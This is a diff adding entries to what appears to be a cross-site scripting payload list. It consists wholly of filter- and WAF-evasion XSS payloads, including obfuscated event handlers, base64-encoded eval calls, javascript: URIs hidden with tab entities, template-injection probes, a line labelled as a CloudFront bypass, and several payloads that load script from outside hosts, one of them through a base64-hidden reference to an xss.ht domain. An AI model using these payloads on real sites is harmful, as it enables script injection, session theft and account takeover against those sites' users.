@@ -1,3 +1,37 @@
+'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//xSs></scripT>
+
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+
+<svg><circle><set onbegin=prompt(1) attributename=fill>
+
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+
+"%3balert`1`%3b"
+
+asd"`> onpointerenter=x=prompt,x`XSS`
+
+<x onauxclick=a=alert,a(domain)>click
+
+<x onauxclick=import('//xss/')>click
+
+\"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss
+
+{{constructor.constructor(alert`1`)()}}
+
+javascript:new%20Function`al\ert\`1\``;
+
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+
+<img ignored=() src=x onerror=prompt(1)>
+
+<svg onx=() onload=(confirm)(1)>
+
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
+
+'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//xSs></scripT>
+
 <svg><set onbegin=d=document,b='`',d['loca'+'tion']='javascript&colon;aler'+'t'+b+domain+b>
 
 "><input onfocus=eval(atob(http://this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc2x3YS54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
